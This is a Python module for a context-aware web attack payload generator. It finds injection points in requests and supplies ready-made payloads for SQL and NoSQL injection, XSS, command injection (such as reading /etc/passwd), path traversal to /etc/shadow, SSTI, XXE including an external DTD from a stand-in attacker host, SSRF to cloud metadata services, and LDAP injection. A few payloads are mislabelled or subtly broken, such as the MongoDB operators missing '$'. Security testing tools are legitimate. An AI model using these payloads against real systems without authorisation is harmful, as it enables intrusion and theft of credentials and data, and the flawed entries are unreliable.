"""
Context-Aware Payload Generator
Analyzes parameter context (JSON, URL-param, Header, etc.) and generates
appropriate payloads for different vulnerability types
"""
import re
import json
import html
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class PayloadContext(Enum):
    """Payload injection context"""
    URL_PARAMETER = "url_parameter"
    JSON_BODY = "json_body"
    XML_BODY = "xml_body"
    FORM_DATA = "form_data"
    HEADER = "header"
    COOKIE = "cookie"
    PATH_PARAMETER = "path_parameter"
    MULTIPART = "multipart"
    GRAPHQL = "graphql"
    SOAP = "soap"


class ParameterType(Enum):
    """Parameter data type"""
    STRING = "string"
    INTEGER = "integer"
    FLOAT = "float"
    BOOLEAN = "boolean"
    ARRAY = "array"
    OBJECT = "object"
    UNKNOWN = "unknown"


class VulnerabilityClass(Enum):
    """Vulnerability class for payload selection"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    SSTI = "ssti"
    XXE = "xxe"
    SSRF = "ssrf"
    LDAP_INJECTION = "ldap_injection"
    RCE = "rce"
    FILE_UPLOAD = "file_upload"


@dataclass
class Payload:
    """Injection payload"""
    value: str
    vulnerability: VulnerabilityClass
    context: PayloadContext
    encoding: str = "raw"
    description: str = ""
    success_indicator: Optional[str] = None
    tags: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            'value': self.value,
            'vulnerability': self.vulnerability.value,
            'context': self.context.value,
            'encoding': self.encoding,
            'description': self.description,
            'tags': self.tags
        }


@dataclass
class ParameterInfo:
    """Parameter information"""
    name: str
    value: Any
    param_type: ParameterType
    context: PayloadContext
    location: str  # query, body, header, cookie, path
    required: bool = False
    nullable: bool = True
    max_length: Optional[int] = None
    pattern: Optional[str] = None


class ContextAnalyzer:
    """Analyzes request context to determine appropriate payloads"""

    def __init__(self):
        # Content type patterns
        self.content_type_map = {
            'application/json': PayloadContext.JSON_BODY,
            'application/xml': PayloadContext.XML_BODY,
            'text/xml': PayloadContext.XML_BODY,
            'application/x-www-form-urlencoded': PayloadContext.FORM_DATA,
            'multipart/form-data': PayloadContext.MULTIPART,
            'application/graphql': PayloadContext.GRAPHQL,
            'text/plain': PayloadContext.FORM_DATA,
        }

        # Parameter type detection patterns
        self.type_patterns = {
            ParameterType.INTEGER: r'^-?\d+$',
            ParameterType.FLOAT: r'^-?\d+\.\d+$',
            ParameterType.BOOLEAN: r'^(true|false|yes|no|1|0|on|off)$',
            ParameterType.ARRAY: r'^\[.*\]$|^\[.*\]$|.*,.*$',
            ParameterType.OBJECT: r'^\{.*\}$',
        }

        # Semantic parameter names (indicate specific types)
        self.semantic_params = {
            'email': r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$',
            'url': r'^https?://',
            'uuid': r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$',
            'date': r'^\d{4}-\d{2}-\d{2}',
            'phone': r'^\+?[\d\s-()]+$',
            'ip': r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$',
        }

    def analyze_content_type(self, content_type: str) -> PayloadContext:
        """Determine context from Content-Type header"""
        if not content_type:
            return PayloadContext.URL_PARAMETER

        content_type = content_type.lower().split(';')[0].strip()

        return self.content_type_map.get(content_type, PayloadContext.FORM_DATA)

    def analyze_parameter_type(self, name: str, value: Any) -> Tuple[ParameterType, str]:
        """
        Analyze parameter to determine its type and constraints
        Returns (type, detected_pattern)
        """
        if value is None:
            return ParameterType.UNKNOWN, ""

        str_value = str(value)

        # Check semantic parameter names first
        for param_name, pattern in self.semantic_params.items():
            if param_name.lower() in name.lower():
                if re.match(pattern, str_value, re.IGNORECASE):
                    return ParameterType.STRING, f"semantic:{param_name}"

        # Check value patterns
        for param_type, pattern in self.type_patterns.items():
            if re.match(pattern, str_value, re.IGNORECASE):
                return param_type, pattern

        # Default to string
        return ParameterType.STRING, ""

    def analyze_json_structure(self, json_data: Dict) -> List[ParameterInfo]:
        """Analyze JSON body structure"""
        params = []

        def traverse(data: Any, path: str = ""):
            if isinstance(data, dict):
                for key, value in data.items():
                    new_path = f"{path}.{key}" if path else key
                    param_type, pattern = self.analyze_parameter_type(key, value)
                    params.append(ParameterInfo(
                        name=new_path,
                        value=value,
                        param_type=param_type,
                        context=PayloadContext.JSON_BODY,
                        location="body"
                    ))
                    traverse(value, new_path)
            elif isinstance(data, list):
                for i, item in enumerate(data):
                    traverse(item, f"{path}[{i}]")

        traverse(json_data)
        return params

    def analyze_url(self, url: str) -> List[ParameterInfo]:
        """Analyze URL for parameters"""
        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(url)
        params = []

        # Query parameters
        query_params = parse_qs(parsed.query)
        for name, values in query_params.items():
            value = values[0] if values else ""
            param_type, pattern = self.analyze_parameter_type(name, value)
            params.append(ParameterInfo(
                name=name,
                value=value,
                param_type=param_type,
                context=PayloadContext.URL_PARAMETER,
                location="query"
            ))

        # Path parameters (look for values in path segments)
        path_parts = parsed.path.split('/')
        for i, part in enumerate(path_parts):
            if part and not part.startswith('{'):
                param_type, pattern = self.analyze_parameter_type(f"path_{i}", part)
                if param_type in [ParameterType.INTEGER, ParameterType.STRING]:
                    params.append(ParameterInfo(
                        name=f"path_segment_{i}",
                        value=part,
                        param_type=param_type,
                        context=PayloadContext.PATH_PARAMETER,
                        location="path"
                    ))

        return params

    def detect_injection_points(
        self,
        url: str,
        method: str,
        headers: Dict[str, str],
        body: Optional[Any] = None
    ) -> List[ParameterInfo]:
        """Detect all potential injection points in request"""
        injection_points = []

        # Analyze URL
        injection_points.extend(self.analyze_url(url))

        # Analyze headers (look for custom headers)
        for name, value in headers.items():
            if name.lower() not in ['host', 'connection', 'accept', 'accept-language',
                                     'accept-encoding', 'user-agent', 'referer',
                                     'content-type', 'content-length']:
                param_type, _ = self.analyze_parameter_type(name, value)
                injection_points.append(ParameterInfo(
                    name=name,
                    value=value,
                    param_type=param_type,
                    context=PayloadContext.HEADER,
                    location="header"
                ))

        # Analyze body
        if body:
            content_type = headers.get('Content-Type', '')
            context = self.analyze_content_type(content_type)

            if context == PayloadContext.JSON_BODY:
                if isinstance(body, dict):
                    injection_points.extend(self.analyze_json_structure(body))
                elif isinstance(body, str):
                    try:
                        injection_points.extend(self.analyze_json_structure(json.loads(body)))
                    except:
                        pass

            elif context == PayloadContext.FORM_DATA:
                if isinstance(body, str):
                    from urllib.parse import parse_qs
                    params = parse_qs(body)
                    for name, values in params.items():
                        value = values[0] if values else ""
                        param_type, _ = self.analyze_parameter_type(name, value)
                        injection_points.append(ParameterInfo(
                            name=name,
                            value=value,
                            param_type=param_type,
                            context=PayloadContext.FORM_DATA,
                            location="body"
                        ))

        return injection_points


class PayloadGenerator:
    """
    Context-aware payload generator
    Generates appropriate payloads based on parameter context and type
    """

    def __init__(self):
        self.analyzer = ContextAnalyzer()
        self._payloads = self._initialize_payloads()

    def _initialize_payloads(self) -> Dict[VulnerabilityClass, Dict[PayloadContext, List[Payload]]]:
        """Initialize payload database"""
        payloads = {}

        # SQL Injection payloads
        payloads[VulnerabilityClass.SQL_INJECTION] = {
            PayloadContext.URL_PARAMETER: [
                Payload("' OR '1'='1", VulnerabilityClass.SQL_INJECTION, PayloadContext.URL_PARAMETER,
                        description="OR injection", tags=['basic', 'auth_bypass']),
                Payload("' OR 1=1--", VulnerabilityClass.SQL_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Numeric OR injection", tags=['numeric']),
                Payload("' UNION SELECT NULL--", VulnerabilityClass.SQL_INJECTION, PayloadContext.URL_PARAMETER,
                        description="UNION injection", tags=['union']),
                Payload("'; WAITFOR DELAY '0:0:5'--", VulnerabilityClass.SQL_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Time-based MSSQL", tags=['time_based', 'mssql']),
                Payload("' AND SLEEP(5)--", VulnerabilityClass.SQL_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Time-based MySQL", tags=['time_based', 'mysql']),
                Payload("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
                        VulnerabilityClass.SQL_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Error-based injection", tags=['error_based']),
            ],
            PayloadContext.JSON_BODY: [
                Payload("' OR '1'='1", VulnerabilityClass.SQL_INJECTION, PayloadContext.JSON_BODY,
                        description="OR injection", tags=['basic']),
                Payload("admin'--", VulnerabilityClass.SQL_INJECTION, PayloadContext.JSON_BODY,
                        description="Admin bypass", tags=['auth_bypass']),
                Payload("{'ne': null}", VulnerabilityClass.SQL_INJECTION, PayloadContext.JSON_BODY,
                        description="MongoDB $ne injection", tags=['nosql', 'mongodb']),
                Payload("{'gt': ''}", VulnerabilityClass.SQL_INJECTION, PayloadContext.JSON_BODY,
                        description="MongoDB $gt injection", tags=['nosql', 'mongodb']),
            ],
        }

        # XSS payloads
        payloads[VulnerabilityClass.XSS] = {
            PayloadContext.URL_PARAMETER: [
                Payload("<script>alert('XSS')</script>", VulnerabilityClass.XSS, PayloadContext.URL_PARAMETER,
                        description="Basic script injection", tags=['basic']),
                Payload("<img src=x onerror=alert('XSS')>", VulnerabilityClass.XSS, PayloadContext.URL_PARAMETER,
                        description="Image onerror", tags=['event_handler']),
                Payload("<svg onload=alert('XSS')>", VulnerabilityClass.XSS, PayloadContext.URL_PARAMETER,
                        description="SVG onload", tags=['event_handler', 'svg']),
                Payload("{{constructor.constructor('alert(1)')()}}", VulnerabilityClass.XSS, PayloadContext.URL_PARAMETER,
                        description="Angular SSTI", tags=['angular', 'ssti']),
                Payload("javascript:alert('XSS')", VulnerabilityClass.XSS, PayloadContext.URL_PARAMETER,
                        description="JavaScript protocol", tags=['protocol']),
            ],
            PayloadContext.JSON_BODY: [
                Payload("<script>alert('XSS')</script>", VulnerabilityClass.XSS, PayloadContext.JSON_BODY,
                        description="Basic script", tags=['basic']),
                Payload("<img src=x onerror=alert('XSS')>", VulnerabilityClass.XSS, PayloadContext.JSON_BODY,
                        description="Image onerror", tags=['event_handler']),
                Payload("{{constructor.constructor('alert(1)')()}}", VulnerabilityClass.XSS, PayloadContext.JSON_BODY,
                        description="Angular SSTI", tags=['angular']),
            ],
            PayloadContext.HEADER: [
                Payload("<script>alert('XSS')</script>", VulnerabilityClass.XSS, PayloadContext.HEADER,
                        description="Header XSS", tags=['reflected']),
                Payload("'); alert('XSS');//", VulnerabilityClass.XSS, PayloadContext.HEADER,
                        description="Header breakout", tags=['breakout']),
            ],
        }

        # Command Injection payloads
        payloads[VulnerabilityClass.COMMAND_INJECTION] = {
            PayloadContext.URL_PARAMETER: [
                Payload("; id", VulnerabilityClass.COMMAND_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Command separator", tags=['basic']),
                Payload("| id", VulnerabilityClass.COMMAND_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Pipe command", tags=['basic']),
                Payload("&& id", VulnerabilityClass.COMMAND_INJECTION, PayloadContext.URL_PARAMETER,
                        description="AND command", tags=['basic']),
                Payload("`id`", VulnerabilityClass.COMMAND_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Backtick execution", tags=['backtick']),
                Payload("$(id)", VulnerabilityClass.COMMAND_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Subshell execution", tags=['subshell']),
                Payload("; cat /etc/passwd", VulnerabilityClass.COMMAND_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Read passwd", tags=['file_read']),
            ],
            PayloadContext.JSON_BODY: [
                Payload("; id", VulnerabilityClass.COMMAND_INJECTION, PayloadContext.JSON_BODY,
                        description="Command separator", tags=['basic']),
                Payload("| whoami", VulnerabilityClass.COMMAND_INJECTION, PayloadContext.JSON_BODY,
                        description="Pipe whoami", tags=['basic']),
            ],
        }

        # Path Traversal payloads
        payloads[VulnerabilityClass.PATH_TRAVERSAL] = {
            PayloadContext.URL_PARAMETER: [
                Payload("../../../etc/passwd", VulnerabilityClass.PATH_TRAVERSAL, PayloadContext.URL_PARAMETER,
                        description="Basic traversal", tags=['basic', 'linux']),
                Payload("....//....//....//etc/passwd", VulnerabilityClass.PATH_TRAVERSAL, PayloadContext.URL_PARAMETER,
                        description="Double encoding bypass", tags=['bypass']),
                Payload("..%2f..%2f..%2fetc/passwd", VulnerabilityClass.PATH_TRAVERSAL, PayloadContext.URL_PARAMETER,
                        description="URL encoded", tags=['encoded']),
                Payload("/etc/passwd", VulnerabilityClass.PATH_TRAVERSAL, PayloadContext.URL_PARAMETER,
                        description="Absolute path", tags=['absolute']),
                Payload("file:///etc/passwd", VulnerabilityClass.PATH_TRAVERSAL, PayloadContext.URL_PARAMETER,
                        description="File protocol", tags=['protocol']),
                Payload("....\\\\....\\\\....\\\\windows\\\\win.ini", VulnerabilityClass.PATH_TRAVERSAL, PayloadContext.URL_PARAMETER,
                        description="Windows traversal", tags=['windows']),
            ],
            PayloadContext.JSON_BODY: [
                Payload("../../../etc/passwd", VulnerabilityClass.PATH_TRAVERSAL, PayloadContext.JSON_BODY,
                        description="Basic traversal", tags=['basic']),
                Payload("/etc/shadow", VulnerabilityClass.PATH_TRAVERSAL, PayloadContext.JSON_BODY,
                        description="Shadow file", tags=['sensitive']),
            ],
        }

        # SSTI payloads
        payloads[VulnerabilityClass.SSTI] = {
            PayloadContext.URL_PARAMETER: [
                Payload("{{7*7}}", VulnerabilityClass.SSTI, PayloadContext.URL_PARAMETER,
                        description="Basic SSTI test", tags=['test', 'jinja2']),
                Payload("{{constructor.constructor('alert(1)')()}}", VulnerabilityClass.SSTI, PayloadContext.URL_PARAMETER,
                        description="Angular SSTI", tags=['angular']),
                Payload("${7*7}", VulnerabilityClass.SSTI, PayloadContext.URL_PARAMETER,
                        description="Freemarker SSTI", tags=['freemarker']),
                Payload("#{7*7}", VulnerabilityClass.SSTI, PayloadContext.URL_PARAMETER,
                        description="Ruby ERB SSTI", tags=['ruby', 'erb']),
                Payload("{%7*7%}", VulnerabilityClass.SSTI, PayloadContext.URL_PARAMETER,
                        description="Jinja2 statement", tags=['jinja2']),
                Payload("{{''.__class__.__mro__[2].__subclasses__()}}", VulnerabilityClass.SSTI, PayloadContext.URL_PARAMETER,
                        description="Python class enumeration", tags=['python', 'advanced']),
            ],
            PayloadContext.JSON_BODY: [
                Payload("{{7*7}}", VulnerabilityClass.SSTI, PayloadContext.JSON_BODY,
                        description="Basic SSTI", tags=['test']),
                Payload("{{constructor.constructor('alert(1)')()}}", VulnerabilityClass.SSTI, PayloadContext.JSON_BODY,
                        description="Angular SSTI", tags=['angular']),
            ],
        }

        # XXE payloads
        payloads[VulnerabilityClass.XXE] = {
            PayloadContext.XML_BODY: [
                Payload('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                        VulnerabilityClass.XXE, PayloadContext.XML_BODY,
                        description="XXE file read", tags=['file_read', 'linux']),
                Payload('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/xxe">%dtd;]><root/>',
                        VulnerabilityClass.XXE, PayloadContext.XML_BODY,
                        description="XXE external DTD", tags=['external', 'oob']),
            ],
        }

        # SSRF payloads
        payloads[VulnerabilityClass.SSRF] = {
            PayloadContext.URL_PARAMETER: [
                Payload("http://127.0.0.1", VulnerabilityClass.SSRF, PayloadContext.URL_PARAMETER,
                        description="Localhost access", tags=['localhost']),
                Payload("http://169.254.169.254/latest/meta-data/", VulnerabilityClass.SSRF, PayloadContext.URL_PARAMETER,
                        description="AWS metadata", tags=['cloud', 'aws']),
                Payload("http://metadata.google.internal/", VulnerabilityClass.SSRF, PayloadContext.URL_PARAMETER,
                        description="GCP metadata", tags=['cloud', 'gcp']),
                Payload("file:///etc/passwd", VulnerabilityClass.SSRF, PayloadContext.URL_PARAMETER,
                        description="File protocol", tags=['file_read']),
                Payload("gopher://127.0.0.1:6379/_INFO", VulnerabilityClass.SSRF, PayloadContext.URL_PARAMETER,
                        description="Gopher Redis", tags=['gopher', 'redis']),
                Payload("dict://127.0.0.1:11211/", VulnerabilityClass.SSRF, PayloadContext.URL_PARAMETER,
                        description="Dict Memcached", tags=['dict', 'memcached']),
            ],
            PayloadContext.JSON_BODY: [
                Payload("http://127.0.0.1", VulnerabilityClass.SSRF, PayloadContext.JSON_BODY,
                        description="Localhost", tags=['localhost']),
                Payload("http://169.254.169.254/latest/meta-data/", VulnerabilityClass.SSRF, PayloadContext.JSON_BODY,
                        description="AWS metadata", tags=['cloud']),
            ],
        }

        # LDAP Injection payloads
        payloads[VulnerabilityClass.LDAP_INJECTION] = {
            PayloadContext.URL_PARAMETER: [
                Payload("*)(&", VulnerabilityClass.LDAP_INJECTION, PayloadContext.URL_PARAMETER,
                        description="LDAP wildcard", tags=['basic']),
                Payload(")(|(uid=*))", VulnerabilityClass.LDAP_INJECTION, PayloadContext.URL_PARAMETER,
                        description="LDAP OR injection", tags=['or']),
                Payload("*))(|(uid=*", VulnerabilityClass.LDAP_INJECTION, PayloadContext.URL_PARAMETER,
                        description="LDAP bypass", tags=['bypass']),
            ],
            PayloadContext.JSON_BODY: [
                Payload("*)(&", VulnerabilityClass.LDAP_INJECTION, PayloadContext.JSON_BODY,
                        description="LDAP wildcard", tags=['basic']),
            ],
        }

        return payloads

    def get_payloads(
        self,
        vulnerability: VulnerabilityClass,
        context: PayloadContext,
        parameter_info: Optional[ParameterInfo] = None
    ) -> List[Payload]:
        """
        Get payloads for specific vulnerability and context
        """
        vuln_payloads = self._payloads.get(vulnerability, {})
        context_payloads = vuln_payloads.get(context, [])

        # Filter/enhance based on parameter info
        if parameter_info:
            # If numeric type, add numeric-specific payloads
            if parameter_info.param_type == ParameterType.INTEGER:
                context_payloads = self._add_numeric_payloads(context_payloads, vulnerability)

            # If semantic type detected, add relevant payloads
            # (e.g., email param might be vulnerable to specific injections)

        return context_payloads

    def _add_numeric_payloads(self, payloads: List[Payload], vulnerability: VulnerabilityClass) -> List[Payload]:
        """Add numeric-specific payloads"""
        numeric_payloads = []

        if vulnerability == VulnerabilityClass.SQL_INJECTION:
            numeric_payloads.extend([
                Payload("1 OR 1=1", VulnerabilityClass.SQL_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Numeric OR", tags=['numeric']),
                Payload("1 AND 1=1", VulnerabilityClass.SQL_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Numeric AND true", tags=['numeric', 'boolean']),
                Payload("1 AND 1=2", VulnerabilityClass.SQL_INJECTION, PayloadContext.URL_PARAMETER,
                        description="Numeric AND false", tags=['numeric', 'boolean']),
            ])

        return payloads + numeric_payloads if payloads else numeric_payloads

    def get_all_payloads_for_context(
        self,
        context: PayloadContext,
        vulnerabilities: Optional[List[VulnerabilityClass]] = None
    ) -> List[Payload]:
        """Get all payloads for a context, optionally filtered by vulnerability types"""
        all_payloads = []

        if vulnerabilities is None:
            vulnerabilities = list(VulnerabilityClass)

        for vuln in vulnerabilities:
            vuln_payloads = self._payloads.get(vuln, {})
            context_payloads = vuln_payloads.get(context, [])
            all_payloads.extend(context_payloads)

        return all_payloads

    def generate_payloads_for_request(
        self,
        url: str,
        method: str,
        headers: Dict[str, str],
        body: Optional[Any] = None,
        vulnerabilities: Optional[List[VulnerabilityClass]] = None
    ) -> Dict[str, List[Payload]]:
        """
        Generate payloads for all injection points in a request
        Returns dict of parameter_name -> payloads
        """
        injection_points = self.analyzer.detect_injection_points(url, method, headers, body)

        result = {}

        for param in injection_points:
            payloads = []

            if vulnerabilities is None:
                vulnerabilities = [
                    VulnerabilityClass.SQL_INJECTION,
                    VulnerabilityClass.XSS,
                    VulnerabilityClass.COMMAND_INJECTION,
                    VulnerabilityClass.PATH_TRAVERSAL,
                    VulnerabilityClass.SSTI,
                    VulnerabilityClass.SSRF,
                ]

            for vuln in vulnerabilities:
                param_payloads = self.get_payloads(vuln, param.context, param)
                payloads.extend(param_payloads)

            result[param.name] = payloads

        return result

    def encode_payload(self, payload: str, encoding: str, context: PayloadContext) -> str:
        """Encode payload for specific context"""
        if encoding == "url":
            from urllib.parse import quote
            return quote(payload, safe='')
        elif encoding == "html":
            return html.escape(payload)
        elif encoding == "json":
            return json.dumps(payload)[1:-1]  # Remove quotes
        elif encoding == "double_url":
            from urllib.parse import quote
            return quote(quote(payload, safe=''), safe='')
        elif encoding == "unicode":
            return ''.join(f'\\u{ord(c):04x}' for c in payload)

        return payload


# Singleton instance
_payload_generator: Optional[PayloadGenerator] = None


def get_payload_generator() -> PayloadGenerator:
    """Get singleton payload generator instance"""
    global _payload_generator
    if _payload_generator is None:
        _payload_generator = PayloadGenerator()
    return _payload_generator


if __name__ == "__main__":
    # Test
    generator = get_payload_generator()

    # Test context analysis
    analyzer = generator.analyzer

    print("Testing context analysis...")

    # Test URL analysis
    test_url = "http://example.com/api/users?id=123&name=test"
    params = analyzer.analyze_url(test_url)
    print(f"\nURL parameters in {test_url}:")
    for p in params:
        print(f"  - {p.name}: type={p.param_type.value}, context={p.context.value}")

    # Test payload generation
    print("\n\nSQL Injection payloads for URL parameter:")
    sqli_payloads = generator.get_payloads(VulnerabilityClass.SQL_INJECTION, PayloadContext.URL_PARAMETER)
    for p in sqli_payloads[:5]:
        print(f"  - {p.value} ({p.description})")

    print("\n\nXSS payloads for JSON body:")
    xss_payloads = generator.get_payloads(VulnerabilityClass.XSS, PayloadContext.JSON_BODY)
    for p in xss_payloads[:5]:
        print(f"  - {p.value} ({p.description})")

    print("\nPayload generator ready!")
